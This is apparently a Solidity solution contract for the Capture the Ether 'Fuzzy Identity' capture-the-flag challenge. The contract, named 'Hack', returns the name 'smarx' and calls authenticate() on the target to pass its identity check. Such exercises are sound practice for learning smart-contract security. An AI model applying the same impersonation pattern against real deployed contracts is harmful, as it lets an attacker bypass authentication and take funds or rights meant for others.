pragma solidity ^0.4.22;
import "hardhat/console.sol";
interface IFuzzyIdentityChallenge{
    function authenticate() external;
}
contract Hack {
    address public identityContract;
    function setIdentityContract(address _actionsContract) public {
        identityContract = _actionsContract;
    }

    function name() external view returns (bytes32) {
        return bytes32("smarx");
    }
    function auth() public {
        console.log("Address",identityContract);
        IFuzzyIdentityChallenge(identityContract).authenticate();
    }
}